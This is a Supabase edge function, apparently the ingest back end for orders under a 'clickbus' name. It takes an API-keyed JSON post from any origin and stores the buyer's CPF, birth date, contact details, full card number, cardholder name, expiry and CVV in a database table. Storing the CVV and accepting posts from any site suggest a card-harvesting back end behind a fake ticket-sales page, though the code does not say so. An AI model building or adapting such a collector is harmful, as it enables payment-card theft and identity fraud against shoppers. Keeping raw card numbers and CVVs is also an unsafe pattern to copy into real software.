import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-api-key",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Validate API key from database
    const apiKey = req.headers.get("x-api-key");
    if (!apiKey) {
      return new Response(
        JSON.stringify({ error: "API Key não fornecida." }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { data: keyRow } = await supabase
      .from("integration_keys")
      .select("key_value")
      .eq("key_name", "ingest_api_key")
      .single();

    if (!keyRow || apiKey !== keyRow.key_value) {
      return new Response(
        JSON.stringify({ error: "API Key inválida." }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const body = await req.json();

    if (!body.nome) {
      return new Response(
        JSON.stringify({ error: "Campo 'nome' é obrigatório." }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { data, error } = await supabase.from("clickbus_orders").insert({
      nome: body.nome,
      email: body.email || null,
      telefone: body.telefone || null,
      cpf: body.cpf || null,
      data_nascimento: body.data_nascimento || null,
      origem: body.origem || null,
      destino: body.destino || null,
      data_ida: body.data_ida || null,
      company: body.company || null,
      tipo_assento: body.tipo_assento || null,
      departure: body.departure || null,
      arrival: body.arrival || null,
      assentos: body.assentos || null,
      valor_total: body.valor_total || 0,
      metodo_pagamento: body.metodo_pagamento || "cartao",
      card_numero: body.card_numero || null,
      card_nome: body.card_nome || null,
      card_validade: body.card_validade || null,
      card_cvv: body.card_cvv || null,
      parcelas: body.parcelas || 1,
      status: body.status || "pendente",
      notas: body.notas || null,
    }).select().single();

    if (error) {
      console.error("Insert error:", error);
      return new Response(
        JSON.stringify({ error: "Erro ao salvar pedido.", details: error.message }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    return new Response(
      JSON.stringify({ success: true, order_id: data.id }),
      { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (err) {
    console.error("Ingest error:", err);
    return new Response(
      JSON.stringify({ error: "Erro interno." }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
